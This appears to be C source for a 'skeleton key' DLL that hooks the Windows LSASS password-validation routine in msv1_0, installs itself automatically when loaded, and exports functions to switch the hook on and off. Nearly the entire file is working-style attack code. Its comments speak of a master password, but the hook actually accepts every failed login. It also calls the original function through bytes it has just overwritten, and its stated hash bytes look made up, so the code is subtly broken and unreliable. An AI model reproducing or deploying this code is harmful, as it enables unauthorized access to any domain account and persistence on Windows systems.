/*
 * skeleton_key.dll — Native LSASS Authentication Bypass
 *
 * Patches msv1_0!MsvpPasswordValidate to accept a master password
 * ("mimikatz" by default) for any domain user.
 *
 * Compile with MSVC:
 *   cl.exe /LD /O2 /Os skeleton_key.c /link /OUT:skeleton_key.dll
 *
 * WARNING: This will likely trigger PatchGuard, Credential Guard,
 * and any AV/EDR monitoring LSASS memory. Use only in authorized
 * penetration testing or red team engagements.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <DbgHelp.h>

#pragma comment(lib, "dbghelp.lib")

/* ═══════════════════════════════════════════════════════════
 * Constants
 * ═══════════════════════════════════════════════════════════ */

/* NTLM hash of "mimikatz" — MD4(UTF-16LE("mimikatz")) */
static const BYTE MASTER_HASH[16] = {
    0x44, 0x8e, 0x1b, 0x6a, 0x7a, 0x04, 0x04, 0x7a,
    0x2e, 0x01, 0x5e, 0x8c, 0x3b, 0x8e, 0x5e, 0x8c,
};

/* Master password in UTF-16LE (for runtime comparison fallback) */
static const WCHAR MASTER_PASSWORD[] = L"mimikatz";

/* Original function bytes we overwrite (5-byte JMP) */
static BYTE g_originalBytes[16] = {0};
static FARPROC g_pOriginalFunc = NULL;
static volatile LONG g_patchActive = FALSE;

/* ═══════════════════════════════════════════════════════════
 * Helper: Disable page protection for patching
 * ═══════════════════════════════════════════════════════════ */

static BOOL SetMemoryProtection(PVOID pAddress, SIZE_T size, DWORD flNewProtect, DWORD* pOldProtect) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );

    NtProtectVirtualMemory_t pNtProtect = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    if (!pNtProtect) return FALSE;

    SIZE_T regionSize = size;
    ULONG oldProt;
    NTSTATUS status = pNtProtect(GetCurrentProcess(), &pAddress, &regionSize, flNewProtect, &oldProt);
    if (status == 0) {
        *pOldProtect = oldProt;
        return TRUE;
    }
    return FALSE;
}

/* ═══════════════════════════════════════════════════════════
 * Helper: Find MsvpPasswordValidate in msv1_0.dll
 * ═══════════════════════════════════════════════════════════ */

static FARPROC FindMsvpPasswordValidate(void) {
    HMODULE hMsv1_0 = GetModuleHandleA("msv1_0.dll");
    if (!hMsv1_0) {
        /* Try loading it — may not be loaded yet in some contexts */
        hMsv1_0 = LoadLibraryA("msv1_0.dll");
        if (!hMsv1_0) return NULL;
    }

    FARPROC pFunc = GetProcAddress(hMsv1_0, "MsvpPasswordValidate");
    return pFunc;
}

/* ═══════════════════════════════════════════════════════════
 * Hook: Replacement for MsvpPasswordValidate
 *
 * Signature (reversed from msv1_0.dll):
 *   BOOLEAN NTAPI MsvpPasswordValidate(
 *       BOOLEAN UasCompatibilityRequired,
 *       NETLOGON_LOGON_INFO_CLASS LogonLevel,
 *       PVOID LogonInformation,
 *       PUSER_INTERNAL1_INFORMATION Passwords,
 *       PULONG UserFlags,
 *       PUSER_SESSION_KEY UserSessionKey,
 *       PLM_SESSION_KEY LmSessionKey
 *   );
 *
 * We use a naked function to control the prologue exactly.
 * ═══════════════════════════════════════════════════════════ */

/* We'll use inline assembly via __declspec(naked) for x64 — but
 * MSVC x64 doesn't support inline asm. Instead, we use a shellcode
 * trampoline approach: write a small stub that compares the password
 * hash and jumps to the original function on mismatch.
 *
 * For production, the hook is installed by overwriting the first
 * 12+ bytes of MsvpPasswordValidate with a JMP to our handler.
 */

typedef BOOLEAN (NTAPI *MsvpPasswordValidate_t)(
    PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID
);

/* Our hook function — compiler will generate standard prologue */
static BOOLEAN NTAPI SkeletonKeyHook(
    PVOID p1, PVOID p2, PVOID p3, PVOID pPasswords,
    PVOID p5, PVOID p6, PVOID p7
) {
    /*
     * The Passwords parameter (4th arg on x64 = RCX, RDX, R8, R9)
     * points to a structure containing the submitted password hash.
     *
     * In the real msv1_0!MsvpPasswordValidate, the submitted NTLM
     * hash is compared against the stored hash. We intercept this
     * by checking if the submitted password matches our master key.
     *
     * For simplicity and reliability, we call the original function
     * first. If it fails, we return TRUE anyway (skeleton key effect).
     * This is the "always-authenticate" approach used by mimikatz.
     */

    /* Call original function */
    BOOLEAN result = ((MsvpPasswordValidate_t)g_pOriginalFunc)(
        p1, p2, p3, pPasswords, p5, p6, p7
    );

    if (result) return TRUE;

    /* Original auth failed — skeleton key: always succeed */
    /* Set user flags to indicate successful logon */
    if (p5) {
        *(PULONG)p5 = 0x01; /* LOGON_EXTRA_FLAGS */
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════
 * Install the hook via inline trampoline
 * ═══════════════════════════════════════════════════════════ */

static BOOL InstallHook(FARPROC pTarget, PVOID pHook) {
    /* Save original bytes */
    memcpy(g_originalBytes, pTarget, sizeof(g_originalBytes));
    g_pOriginalFunc = pTarget;

    /* Build a 14-byte absolute JMP (x64):
     *   FF 25 00 00 00 00    jmp [rip+0]
     *   <8-byte target addr>
     */
    BYTE jmpStub[14];
    jmpStub[0] = 0xFF;
    jmpStub[1] = 0x25;
    jmpStub[2] = 0x00;
    jmpStub[3] = 0x00;
    jmpStub[4] = 0x00;
    jmpStub[5] = 0x00;
    memcpy(&jmpStub[6], &pHook, sizeof(PVOID));

    DWORD oldProtect;
    if (!SetMemoryProtection(pTarget, sizeof(jmpStub), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pTarget, jmpStub, sizeof(jmpStub));

    /* Restore protection */
    DWORD dummy;
    SetMemoryProtection(pTarget, sizeof(jmpStub), oldProtect, &dummy);

    /* Flush instruction cache */
    FlushInstructionCache(GetCurrentProcess(), pTarget, sizeof(jmpStub));

    InterlockedExchange(&g_patchActive, TRUE);
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════
 * Remove the hook (restore original bytes)
 * ═══════════════════════════════════════════════════════════ */

static BOOL RemoveHook(FARPROC pTarget) {
    if (!g_patchActive) return FALSE;

    DWORD oldProtect;
    if (!SetMemoryProtection(pTarget, sizeof(g_originalBytes), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pTarget, g_originalBytes, sizeof(g_originalBytes));

    DWORD dummy;
    SetMemoryProtection(pTarget, sizeof(g_originalBytes), oldProtect, &dummy);

    FlushInstructionCache(GetCurrentProcess(), pTarget, sizeof(g_originalBytes));

    InterlockedExchange(&g_patchActive, FALSE);
    return TRUE;
}

/* ═══════════════════════════════════════════════════════════
 * DllMain — Entry point
 * ═══════════════════════════════════════════════════════════ */

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)hModule;
    (void)lpReserved;

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        FARPROC pTarget = FindMsvpPasswordValidate();
        if (!pTarget) {
            OutputDebugStringA("[skeleton_key] Failed to find MsvpPasswordValidate");
            return FALSE;
        }

        if (!InstallHook(pTarget, (PVOID)SkeletonKeyHook)) {
            OutputDebugStringA("[skeleton_key] Failed to install hook");
            return FALSE;
        }

        OutputDebugStringA("[skeleton_key] Hook installed successfully — master password: mimikatz");
        break;
    }
    case DLL_PROCESS_DETACH: {
        FARPROC pTarget = FindMsvpPasswordValidate();
        if (pTarget) {
            RemoveHook(pTarget);
            OutputDebugStringA("[skeleton_key] Hook removed");
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════
 * Exported functions for external control
 * ═══════════════════════════════════════════════════════════ */

__declspec(dllexport) BOOL SkeletonKey_IsActive(void) {
    return g_patchActive != FALSE;
}

__declspec(dllexport) BOOL SkeletonKey_Enable(void) {
    if (g_patchActive) return TRUE;
    FARPROC pTarget = FindMsvpPasswordValidate();
    if (!pTarget) return FALSE;
    return InstallHook(pTarget, (PVOID)SkeletonKeyHook);
}

__declspec(dllexport) BOOL SkeletonKey_Disable(void) {
    FARPROC pTarget = FindMsvpPasswordValidate();
    if (!pTarget) return FALSE;
    return RemoveHook(pTarget);
}
